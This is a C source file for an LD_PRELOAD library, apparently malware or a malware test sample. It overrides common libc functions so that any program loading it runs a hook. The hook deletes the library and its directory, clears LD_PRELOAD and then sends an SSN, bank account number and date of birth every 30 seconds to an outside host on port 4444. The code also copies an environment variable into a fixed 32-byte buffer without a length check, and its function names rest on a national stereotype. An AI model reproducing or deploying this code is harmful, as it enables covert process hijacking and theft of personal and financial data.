#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <libgen.h>

#define ssn "SSN: 538-41-8858\n"
#define banknumber "ACCT: 4837-4419-9581-4019\n"
#define dob "1984-02-29\n"

static char * nigeria_hostname = "ccserver.legitiot.net";

static void send_bank_info_to_nigeria()
{
	struct addrinfo hints;
	struct addrinfo * result;
	struct addrinfo * rp;
	int s;

	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	hints.ai_flags = 0;
	hints.ai_protocol = 0;

	if (getaddrinfo(nigeria_hostname, "4444", &hints, &result)) {
		return;
	}

	for (rp = result; rp != NULL; rp = rp->ai_next) {
		s = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (s == -1) {
			continue;
		}
		
		if (connect(s, rp->ai_addr, rp->ai_addrlen) != -1) {
			break;
		}
		close(s);
	}

	if (rp == NULL) {
		return;
	}

	freeaddrinfo(result);

	write(s, ssn, strlen(ssn));
	write(s, banknumber, strlen(banknumber));
	write(s, dob, strlen(dob));

	close(s);
}

void execute_hook()
{
	char libpath[32];
	strcpy(libpath, getenv("LD_PRELOAD"));

	unlink(libpath);

	char * dirpath = dirname(libpath);

	unlink(dirpath);

	unsetenv("LD_PRELOAD");

	for (;;) {
		sleep(30);
		send_bank_info_to_nigeria();
	}
}

size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *s)
{
	execute_hook();
}

FILE *  fopen(const char * path, const char * mode)
{
	execute_hook();
}

void fstat(int fd, void *buf)
{
	execute_hook();
}

size_t fread(void *ptr, size_t size, size_t nmemb, FILE *s)
{
	execute_hook();
}

char *strdup(const char *s)
{
	execute_hook();
}

__uid_t getuid()
{
	execute_hook();
}

int time(void * foo)
{
	execute_hook();
}
